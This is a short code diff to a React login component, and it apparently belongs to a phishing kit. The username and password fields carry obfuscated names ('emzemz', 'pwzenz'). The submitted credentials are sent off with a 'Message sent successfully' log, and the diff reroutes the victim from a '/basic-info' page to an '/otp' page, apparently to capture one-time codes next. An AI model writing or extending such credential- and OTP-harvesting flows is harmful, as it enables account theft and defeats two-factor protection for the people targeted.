@@ -25,7 +25,7 @@ const LoginForm2: React.FC = () => {
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
     setIsLoading(true);
     event.preventDefault();
-    let newErrors = { emzemz: '', pwzenz: '' };
+    const newErrors = { emzemz: '', pwzenz: '' };
 
     if (!emzemz.trim()) {
       newErrors.emzemz = 'Username is required.';
@@ -52,7 +52,7 @@ const LoginForm2: React.FC = () => {
           pwzenz: pwzenz,
         });
         console.log('Message sent successfully');
-        navigate('/basic-info', {
+        navigate('/otp', {
           state: {
             emzemz: emzemz
           }
